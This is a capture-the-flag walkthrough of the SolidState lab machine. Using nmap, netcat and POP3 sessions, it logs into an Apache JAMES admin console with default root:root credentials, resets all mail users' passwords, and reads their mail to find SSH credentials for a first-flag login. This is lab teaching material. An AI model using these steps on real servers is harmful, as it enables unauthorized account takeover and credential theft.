### SolidState: 1

#### About
  - Name: SolidState: 1
  - Date release: 12 Sep 2018

  - Author: [Ch33z_plz](https://www.vulnhub.com/author/ch33z_plz,242/)
  - Series: [SolidState](https://www.vulnhub.com/series/solidstate,180/)

#### Description
It was originally created for HackTheBox

---------------

# Walkthrough

## Enumeration

***Nmap***

The first thing that stands out is the the JAMES services running (we've seen these before):

```
root@kali:~# nmap -Pn -sC -sV 192.168.165.136
Starting Nmap 7.70 ( https://nmap.org ) at 2018-11-25 17:20 EST
Nmap scan report for 192.168.165.136
Host is up (0.00073s latency).
Not shown: 995 closed ports
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0)
| ssh-hostkey:
|   2048 77:00:84:f5:78:b9:c7:d3:54:cf:71:2e:0d:52:6d:8b (RSA)
|   256 78:b8:3a:f6:60:19:06:91:f5:53:92:1d:3f:48:ed:53 (ECDSA)
|_  256 e4:45:e9:ed:07:4d:73:69:43:5a:12:70:9d:c4:af:76 (ED25519)
25/tcp  open  smtp    JAMES smtpd 2.3.2
|_smtp-commands: solidstate Hello nmap.scanme.org (192.168.165.135 [192.168.165.135]), PIPELINING, ENHANCEDSTATUSCODES,
80/tcp  open  http    Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Home - Solid State Security
110/tcp open  pop3    JAMES pop3d 2.3.2
119/tcp open  nntp    JAMES nntpd (posting ok)
MAC Address: 00:0C:29:75:23:E9 (VMware)
Service Info: Host: solidstate; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.52 seconds
```

So, naturally we want to check if the admin port is accessible and.... of coarse it is:

```
root@kali:~# nmap -Pn -sC -sV -p 4555 192.168.165.136
Starting Nmap 7.70 ( https://nmap.org ) at 2018-11-25 17:20 EST
Nmap scan report for 192.168.165.136
Host is up (0.00045s latency).

PORT     STATE SERVICE     VERSION
4555/tcp open  james-admin JAMES Remote Admin 2.3.2
MAC Address: 00:0C:29:75:23:E9 (VMware)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.46 seconds
```

***Netcat***

The next step is to connect to the admin port with netcat and check if it's still using the default credentials (root:root), which it is:

```
root@kali:~# nc 192.168.165.136 4555
JAMES Remote Administration Tool 2.3.2
Please enter your login and password
Login id:
root
Password:
root
Welcome root. HELP for a list of commands
HELP
Currently implemented commands:
help                                    display this help
listusers                               display existing accounts
countusers                              display the number of existing accounts
adduser [username] [password]           add a new user
verify [username]                       verify if specified user exist
deluser [username]                      delete existing user
setpassword [username] [password]       sets a user's password
setalias [user] [alias]                 locally forwards all email for 'user' to 'alias'
showalias [username]                    shows a user's current email alias
unsetalias [user]                       unsets an alias for 'user'
setforwarding [username] [emailaddress] forwards a user's email to another email address
showforwarding [username]               shows a user's current email forwarding
unsetforwarding [username]              removes a forward
user [repositoryname]                   change to another user repository
shutdown                                kills the current JVM (convenient when James is run as a daemon)
quit                                    close connection
```

`The IP of the VM changed as I did the second half on a differant computer`

Here we see a list of existing users and are able to reset their passwords, so changing the password for james should allow us to log into the other application's services as that user:

```
root@kali:~# nc 172.16.11.147 4555
JAMES Remote Administration Tool 2.3.2
Please enter your login and password
Login id:
root
Password:
root
Welcome root. HELP for a list of commands
listusers
Existing accounts 5
user: james
user: thomas
user: john
user: mindy
user: mailadmin
setpassword james pass
Password for james reset
```

It appears that james doens't have any emails, so now we just have to make our way down the user list:

***James***
```
root@kali:~# nc -nC 172.16.11.147 110
+OK solidstate POP3 server (JAMES POP3 Server 2.3.2) ready 
user james
+OK
pass pass
+OK Welcome james
list
+OK 0 0
.
```
***Thomas***
```
root@kali:~# nc -nC 172.16.11.147 110
+OK solidstate POP3 server (JAMES POP3 Server 2.3.2) ready 
user thomas
+OK
pass pass
+OK Welcome thomas
list
+OK 0 0
.
```
***John*** 
```
root@kali:~# nc -nC 172.16.11.147 110
+OK solidstate POP3 server (JAMES POP3 Server 2.3.2) ready 
user john
+OK
pass pass
+OK Welcome john
list
+OK 1 743
1 743
.
```
***Mindy***
```
root@kali:~# nc -nC 172.16.11.147 110
+OK solidstate POP3 server (JAMES POP3 Server 2.3.2) ready 
user mindy
+OK
pass pass
+OK Welcome mindy
list
+OK 2 1945
1 1109
2 836
.
```
***Mailadmin***
```
root@kali:~# nc -nC 172.16.11.147 110
+OK solidstate POP3 server (JAMES POP3 Server 2.3.2) ready 
user mailadmin
+OK
pass pass
+OK Welcome mailadmin
list
+OK 0 0
.
```

Okay, so John and Mindy are the only two accounts with emails (One for John and two for Mindy). Lets read them to see if there is anything we can use: 

***John***
```
retr 1
+OK Message follows
Return-Path: <mailadmin@localhost>
Message-ID: <9564574.1.1503422198108.JavaMail.root@solidstate>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit
Delivered-To: john@localhost
Received: from 192.168.11.142 ([192.168.11.142])
          by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 581
          for <john@localhost>;
          Tue, 22 Aug 2017 13:16:20 -0400 (EDT)
Date: Tue, 22 Aug 2017 13:16:20 -0400 (EDT)
From: mailadmin@localhost
Subject: New Hires access
John, 

Can you please restrict mindy's access until she gets read on to the program. Also make sure that you send her a tempory password to login to her accounts.

Thank you in advance.

Respectfully,
James
```

Well, that looks promising: `Also make sure that you send her a tempory password to login to her accounts.`

***Mindy***
```
retr 2
+OK Message follows
Return-Path: <mailadmin@localhost>
Message-ID: <16744123.2.1503422270399.JavaMail.root@solidstate>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit
Delivered-To: mindy@localhost
Received: from 192.168.11.142 ([192.168.11.142])
          by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 581
          for <mindy@localhost>;
          Tue, 22 Aug 2017 13:17:28 -0400 (EDT)
Date: Tue, 22 Aug 2017 13:17:28 -0400 (EDT)
From: mailadmin@localhost
Subject: Your Access

Dear Mindy,


Here are your ssh credentials to access the system. Remember to reset your password after your first login. 
Your access is restricted at the moment, feel free to ask your supervisor to add any commands you need to your path. 

username: mindy
pass: P@55W0rd1!2@

Respectfully,
James
```
```
username: mindy
pass: P@55W0rd1!2@
```
And there are the temporary credentials, let's see if they are still valid on the other services. 

## Gaining Access

Since the web application doens't appear to have a login page at first glance trying Midy's temprary credentials with SSH gets us access to the box and get the first flag (that would have been for Hack The Box):

```
root@kali:~# ssh mindy@172.16.11.147                                                                                        
mindy@172.16.11.147's password:                                         
Linux solidstate 4.9.0-3-686-pae #1 SMP Debian 4.9.30-2+deb9u5 (2017-09-19) i686                                            
                                           
The programs included with the Debian GNU/Linux system are free software;                                                   
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.                                                                             
                                                                                                                            
Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Wed Nov 28 11:39:07 2018 from 172.16.11.129
mindy@solidstate:~$ ls
bin  user.txt
mindy@solidstate:~$ cat user.txt 
914d0a4ebc1777889b5b89a23f556fd75
mindy@solidstate:~$ 
```

```
mindy@solidstate:~$ cat user.txt 
914d0a4ebc1777889b5b89a23f556fd75
```


